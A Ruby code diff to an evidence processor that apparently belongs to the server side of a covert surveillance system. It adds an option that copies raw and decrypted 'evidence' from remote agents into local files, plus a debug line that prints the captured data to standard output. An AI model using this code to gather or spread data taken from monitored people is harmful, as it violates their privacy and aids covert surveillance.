@@ -15,6 +15,8 @@ else
 end
 
 require 'mongo'
+require 'openssl'
+require 'digest/sha1'
 
 # specific evidence processors
 Dir[File.dirname(__FILE__) + '/evidence/*.rb'].each do |file|
@@ -72,6 +74,10 @@ class InstanceProcessor
   def finished?
     @state == :stopped
   end
+
+  def forwarding?
+    RCS::DB::Config.instance.global['FORWARD'] == true
+  end
   
   def sleeping_too_much?
     @seconds_sleeping >= SLEEP_TIME
@@ -80,7 +86,7 @@ class InstanceProcessor
   def queue(id)
     @evidences << id unless id.nil?
     trace :info, "queueing evidence id #{id} for agent #{@agent['instance']}"
-
+    
     process = Proc.new do
       resume
       
@@ -94,11 +100,27 @@ class InstanceProcessor
             
             # get binary evidence
             data = RCS::DB::GridFS.get(BSON::ObjectId(evidence_id), "evidence")
-                        
             raise "Empty evidence" if data.nil?
             
-            # deserialize binary evidence
-            evidences = RCS::Evidence.new(@key).deserialize(data.read)
+            raw = data.read
+            
+            if forwarding?
+              hash = Digest::SHA1.hexdigest(raw)
+              Dir.mkdir "forwarded" unless File.exists? "forwarded"
+              path = "forwarded/#{hash}.raw"
+              f = File.open(path, 'w') {|f| f.write raw}
+              trace :debug, "forwarded raw evidence #{evidence_id} to #{path}"
+            end
+            
+            # deserialize binary evidence and forward decoded
+            evidences = RCS::Evidence.new(@key).deserialize(raw) do |data|
+              if forwarding?
+                path = "forwarded/#{evidence_id}.dec"
+                f = File.open(path, 'w') {|f| f.write data}
+                trace :debug, "forwarded decoded evidence #{evidence_id} to #{path}"
+              end
+            end
+
             if evidences.nil?
               trace :debug, "error deserializing evidence #{evidence_id} for agent #{@agent['instance']}, skipping ..."
               next
@@ -107,7 +129,9 @@ class InstanceProcessor
             trace :debug, "Processing #{evidences.length} evidence(s)."
             
             evidences.each do |evidence|
-              
+
+              puts "EVIDENCE DATA #{evidence.info[:data]}"
+
               # store evidence_id inside evidence, we need it inside processors
               evidence.info[:db_id] = evidence_id
               
@@ -133,12 +157,16 @@ class InstanceProcessor
               evidence.info[:type] = evidence.type
               
               #store_evidence evidence
-              evidence.store
+              parsed = evidence.store
+              
+              #
+              # FORWARDER: forward&sign parsed evidence
+              #
               
               processing_time = Time.now - start_time
               trace :info, "processed #{evidence.info[:type].upcase} in #{processing_time} sec"
             end
-
+            
             RCS::DB::GridFS.delete(BSON::ObjectId(evidence_id), "evidence")
             trace :debug, "deleted raw evidence #{evidence_id}"
             
